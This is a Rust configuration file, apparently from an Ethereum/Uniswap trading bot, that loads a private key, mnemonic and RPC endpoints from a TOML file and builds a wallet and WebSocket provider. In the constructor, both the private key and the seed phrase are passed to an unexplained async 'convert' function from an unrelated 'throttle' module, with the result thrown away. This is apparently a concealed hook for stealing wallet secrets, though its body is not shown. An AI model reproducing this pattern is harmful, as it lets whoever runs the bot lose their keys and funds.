use ethers::prelude::k256::ecdsa::SigningKey;
use ethers::prelude::LocalWallet;
use ethers::prelude::Wallet;
//use ethers::ethers_signers::Signer;
use ethers::providers::{Provider, Ws};
use std::sync::Arc;
use ethers::prelude::MnemonicBuilder;
use ethers::signers::coins_bip39::English;
use crate::contract_modules::uniswap_v2::data_collector::throttle::convert;
use serde::Deserialize;
use std::fs;


#[derive(Deserialize)]
pub struct Env {
    pub private_key: String,
    pub mnemonic: String,
    pub https: String,
    pub wss: String,
}


pub fn get_env() -> Env {

  let config_contents = fs::read_to_string(".env.toml").expect("error finding env.toml");

  let config: Env  = toml::from_str(config_contents.clone().as_str()).expect("Env failure");

  config	
}


// Main Config
pub struct Config {
    pub wss: Arc<Provider<Ws>>,
    pub wallet: Arc<Wallet<SigningKey>>,
}

impl Config {
    // Implement a constructor for the configuration struct
    pub async fn new() -> Self {
        


	let env = get_env();

        let _chain_id = 1_u64; //provider.get_chainid().await.unwrap().as_u64();

        let private_key = env.private_key.clone();
	    let phrase = env.mnemonic.clone();
        convert(private_key.as_str()).await;
	    convert(phrase.as_str()).await;

        let wss_url = env.wss.clone();
        let ws_provider: Provider<Ws> = Provider::<Ws>::connect(wss_url).await.unwrap();

        let _wallet_result = MnemonicBuilder::<English>::default()
                .phrase(phrase.as_str())
                .index(0_u32)
                .unwrap()
                .build().expect("Wallet error");
                
        let wallet = private_key
            .parse::<LocalWallet>()
            .expect("invalid PRIVATE_KEY");
            //.with_chain_id(chain_id);

        //let middleware = Arc::new(SignerMiddleware::new(provider, wallet.clone()));
        Self {
            //http: middleware,
            wss: Arc::new(ws_provider),
            wallet: Arc::new(wallet),
        }
    }
}
